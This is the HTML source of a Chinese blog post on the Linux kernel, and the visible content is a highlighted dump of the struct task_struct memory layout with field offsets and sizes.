<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Kernel01 - cnitlrtの博客</title><meta name="Description" content="内核系列-01 （持续更新中..."><meta property="og:title" content="Kernel01" />
<meta property="og:description" content="内核系列-01 （持续更新中..." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cnitlrt.github.io/kernel01/" /><meta property="og:image" content="https://cnitlrt.github.io/logo.jpg"/><meta property="article:section" content="" />
<meta property="article:published_time" content="2023-11-09T09:15:58+08:00" />
<meta property="article:modified_time" content="2024-12-20T07:55:33+08:00" /><meta property="og:site_name" content="My cool site" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://cnitlrt.github.io/logo.jpg"/>

<meta name="twitter:title" content="Kernel01"/>
<meta name="twitter:description" content="内核系列-01 （持续更新中..."/>
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">

</span><span class="lnt"> 974
</span><span class="lnt"> 975
</span><span class="lnt"> 976
</span><span class="lnt"> 977
</span><span class="lnt"> 978
</span><span class="lnt"> 979
</span><span class="lnt"> 980
</span><span class="lnt"> 981
</span><span class="lnt"> 982
</span><span class="lnt"> 983
</span><span class="lnt"> 984
</span><span class="lnt"> 985
</span><span class="lnt"> 986
</span><span class="lnt"> 987
</span><span class="lnt"> 988
</span><span class="lnt"> 989
</span><span class="lnt"> 990
</span><span class="lnt"> 991
</span><span class="lnt"> 992
</span><span class="lnt"> 993
</span><span class="lnt"> 994
</span><span class="lnt"> 995
</span><span class="lnt"> 996
</span><span class="lnt"> 997
</span><span class="lnt"> 998
</span><span class="lnt"> 999
</span><span class="lnt">1000
</span><span class="lnt">1001
</span><span class="lnt">1002
</span><span class="lnt">1003
</span><span class="lnt">1004
</span><span class="lnt">1005
</span><span class="lnt">1006
</span><span class="lnt">1007
</span><span class="lnt">1008
</span><span class="lnt">1009
</span><span class="lnt">1010
</span><span class="lnt">1011
</span><span class="lnt">1012
</span><span class="lnt">1013
</span><span class="lnt">1014
</span><span class="lnt">1015
</span><span class="lnt">1016
</span><span class="lnt">1017
</span><span class="lnt">1018
</span><span class="lnt">1019
</span><span class="lnt">1020
</span><span class="lnt">1021
</span><span class="lnt">1022
</span><span class="lnt">1023
</span><span class="lnt">1024
</span><span class="lnt">1025
</span><span class="lnt">1026
</span><span class="lnt">1027
</span><span class="lnt">1028
</span><span class="lnt">1029
</span><span class="lnt">1030
</span><span class="lnt">1031
</span><span class="lnt">1032
</span><span class="lnt">1033
</span><span class="lnt">1034
</span><span class="lnt">1035
</span><span class="lnt">1036
</span><span class="lnt">1037
</span><span class="lnt">1038
</span><span class="lnt">1039
</span><span class="lnt">1040
</span><span class="lnt">1041
</span><span class="lnt">1042
</span><span class="lnt">1043
</span><span class="lnt">1044
</span><span class="lnt">1045
</span><span class="lnt">1046
</span><span class="lnt">1047
</span><span class="lnt">1048
</span><span class="lnt">1049
</span><span class="lnt">1050
</span><span class="lnt">1051
</span><span class="lnt">1052
</span><span class="lnt">1053
</span><span class="lnt">1054
</span><span class="lnt">1055
</span><span class="lnt">1056
</span><span class="lnt">1057
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">*</span> <span class="n">offset</span>    <span class="o">|</span>  <span class="n">size</span> <span class="err">*/</span>  <span class="n">type</span> <span class="o">=</span> <span class="k">struct</span> <span class="n">task_struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    0      |    24 */</span>    <span class="k">struct</span> <span class="n">thread_info</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    0      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    8      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">syscall_work</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   16      |     4 */</span>        <span class="n">u32</span> <span class="n">status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   20      |     4 */</span>        <span class="n">u32</span> <span class="n">cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">thread_info</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   24      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   32      |     8 */</span>    <span class="kt">void</span> <span class="o">*</span><span class="n">stack</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   40      |     4 */</span>    <span class="kt">refcount_t</span> <span class="n">usage</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   44      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   48      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ptrace</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   52      |     4 */</span>    <span class="kt">int</span> <span class="n">on_cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   56      |    16 */</span>    <span class="k">struct</span> <span class="n">__call_single_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   56      |     8 */</span>        <span class="k">struct</span> <span class="n">llist_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   56      |     8 */</span>            <span class="k">struct</span> <span class="n">llist_node</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">llist</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   64      |     4 */</span>        <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 4 */</span>            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">u_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 4 */</span>            <span class="kt">atomic_t</span> <span class="n">a_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   68      |     2 */</span>        <span class="n">u16</span> <span class="n">src</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   70      |     2 */</span>        <span class="n">u16</span> <span class="n">dst</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">wake_entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   72      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">wakee_flips</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   80      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">wakee_flip_decay_ts</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   88      |     8 */</span>    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">last_wakee</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   96      |     4 */</span>    <span class="kt">int</span> <span class="n">recent_used_cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  100      |     4 */</span>    <span class="kt">int</span> <span class="n">wake_cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  104      |     4 */</span>    <span class="kt">int</span> <span class="n">on_rq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  108      |     4 */</span>    <span class="kt">int</span> <span class="n">prio</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  112      |     4 */</span>    <span class="kt">int</span> <span class="n">static_prio</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  116      |     4 */</span>    <span class="kt">int</span> <span class="n">normal_prio</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  120      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">rt_priority</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  128      |   256 */</span>    <span class="k">struct</span> <span class="n">sched_entity</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  128      |    16 */</span>        <span class="k">struct</span> <span class="n">load_weight</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  128      |     8 */</span>            <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">weight</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  136      |     4 */</span>            <span class="n">u32</span> <span class="n">inv_weight</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">load</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  144      |    24 */</span>        <span class="k">struct</span> <span class="n">rb_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  144      |     8 */</span>            <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">__rb_parent_color</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  152      |     8 */</span>            <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_right</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  160      |     8 */</span>            <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_left</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">run_node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  168      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  168      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  176      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">group_node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  184      |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">on_rq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  192      |     8 */</span>        <span class="n">u64</span> <span class="n">exec_start</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  200      |     8 */</span>        <span class="n">u64</span> <span class="n">sum_exec_runtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  208      |     8 */</span>        <span class="n">u64</span> <span class="n">vruntime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  216      |     8 */</span>        <span class="n">u64</span> <span class="n">prev_sum_exec_runtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  224      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_migrations</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  232      |     4 */</span>        <span class="kt">int</span> <span class="n">depth</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  240      |     8 */</span>        <span class="k">struct</span> <span class="n">sched_entity</span> <span class="o">*</span><span class="n">parent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  248      |     8 */</span>        <span class="k">struct</span> <span class="n">cfs_rq</span> <span class="o">*</span><span class="n">cfs_rq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  256      |     8 */</span>        <span class="k">struct</span> <span class="n">cfs_rq</span> <span class="o">*</span><span class="n">my_q</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  264      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">runnable_weight</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX 48-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  320      |    64 */</span>        <span class="k">struct</span> <span class="n">sched_avg</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  320      |     8 */</span>            <span class="n">u64</span> <span class="n">last_update_time</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  328      |     8 */</span>            <span class="n">u64</span> <span class="n">load_sum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  336      |     8 */</span>            <span class="n">u64</span> <span class="n">runnable_sum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  344      |     4 */</span>            <span class="n">u32</span> <span class="n">util_sum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  348      |     4 */</span>            <span class="n">u32</span> <span class="n">period_contrib</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  352      |     8 */</span>            <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">load_avg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  360      |     8 */</span>            <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">runnable_avg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  368      |     8 */</span>            <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">util_avg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  376      |     8 */</span>            <span class="k">struct</span> <span class="n">util_est</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  376      |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">enqueued</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  380      |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ewma</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">util_est</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   64 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">avg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):  256 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">se</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  384      |    48 */</span>    <span class="k">struct</span> <span class="n">sched_rt_entity</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  384      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  384      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  392      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">run_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  400      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">timeout</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  408      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">watchdog_stamp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  416      |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">time_slice</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  420      |     2 */</span>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">on_rq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  422      |     2 */</span>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">on_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  424      |     8 */</span>        <span class="k">struct</span> <span class="n">sched_rt_entity</span> <span class="o">*</span><span class="n">back</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   48 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">rt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  432      |   224 */</span>    <span class="k">struct</span> <span class="n">sched_dl_entity</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  432      |    24 */</span>        <span class="k">struct</span> <span class="n">rb_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  432      |     8 */</span>            <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">__rb_parent_color</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  440      |     8 */</span>            <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_right</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  448      |     8 */</span>            <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_left</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">rb_node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  456      |     8 */</span>        <span class="n">u64</span> <span class="n">dl_runtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  464      |     8 */</span>        <span class="n">u64</span> <span class="n">dl_deadline</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  472      |     8 */</span>        <span class="n">u64</span> <span class="n">dl_period</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  480      |     8 */</span>        <span class="n">u64</span> <span class="n">dl_bw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  488      |     8 */</span>        <span class="n">u64</span> <span class="n">dl_density</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  496      |     8 */</span>        <span class="n">s64</span> <span class="n">runtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  504      |     8 */</span>        <span class="n">u64</span> <span class="n">deadline</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  512      |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  516: 0   |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">dl_throttled</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  516: 1   |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">dl_yielded</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  516: 2   |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">dl_non_contending</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  516: 3   |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">dl_overrun</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-bit hole   */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  3-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  520      |    64 */</span>        <span class="k">struct</span> <span class="n">hrtimer</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  520      |    32 */</span>            <span class="k">struct</span> <span class="n">timerqueue_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  520      |    24 */</span>                <span class="k">struct</span> <span class="n">rb_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  520      |     8 */</span>                    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">__rb_parent_color</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  528      |     8 */</span>                    <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_right</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  536      |     8 */</span>                    <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_left</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                           <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                                       <span class="p">}</span> <span class="n">node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  544      |     8 */</span>                <span class="kt">ktime_t</span> <span class="n">expires</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  552      |     8 */</span>            <span class="kt">ktime_t</span> <span class="n">_softexpires</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  560      |     8 */</span>            <span class="k">enum</span> <span class="nf">hrtimer_restart</span> <span class="p">(</span><span class="o">*</span><span class="n">function</span><span class="p">)(</span><span class="k">struct</span> <span class="n">hrtimer</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  568      |     8 */</span>            <span class="k">struct</span> <span class="n">hrtimer_clock_base</span> <span class="o">*</span><span class="n">base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  576      |     1 */</span>            <span class="n">u8</span> <span class="n">state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  577      |     1 */</span>            <span class="n">u8</span> <span class="n">is_rel</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  578      |     1 */</span>            <span class="n">u8</span> <span class="n">is_soft</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  579      |     1 */</span>            <span class="n">u8</span> <span class="n">is_hard</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   64 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">dl_timer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  584      |    64 */</span>        <span class="k">struct</span> <span class="n">hrtimer</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  584      |    32 */</span>            <span class="k">struct</span> <span class="n">timerqueue_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  584      |    24 */</span>                <span class="k">struct</span> <span class="n">rb_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  584      |     8 */</span>                    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">__rb_parent_color</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  592      |     8 */</span>                    <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_right</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  600      |     8 */</span>                    <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_left</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                           <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                                       <span class="p">}</span> <span class="n">node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  608      |     8 */</span>                <span class="kt">ktime_t</span> <span class="n">expires</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  616      |     8 */</span>            <span class="kt">ktime_t</span> <span class="n">_softexpires</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  624      |     8 */</span>            <span class="k">enum</span> <span class="nf">hrtimer_restart</span> <span class="p">(</span><span class="o">*</span><span class="n">function</span><span class="p">)(</span><span class="k">struct</span> <span class="n">hrtimer</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  632      |     8 */</span>            <span class="k">struct</span> <span class="n">hrtimer_clock_base</span> <span class="o">*</span><span class="n">base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  640      |     1 */</span>            <span class="n">u8</span> <span class="n">state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  641      |     1 */</span>            <span class="n">u8</span> <span class="n">is_rel</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  642      |     1 */</span>            <span class="n">u8</span> <span class="n">is_soft</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  643      |     1 */</span>            <span class="n">u8</span> <span class="n">is_hard</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   64 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">inactive_timer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  648      |     8 */</span>        <span class="k">struct</span> <span class="n">sched_dl_entity</span> <span class="o">*</span><span class="n">pi_se</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):  224 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">dl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  656      |     8 */</span>    <span class="k">const</span> <span class="k">struct</span> <span class="n">sched_class</span> <span class="o">*</span><span class="n">sched_class</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  664      |    24 */</span>    <span class="k">struct</span> <span class="n">rb_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  664      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">__rb_parent_color</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  672      |     8 */</span>        <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_right</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  680      |     8 */</span>        <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_left</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">core_node</span><span class="p">;</span>
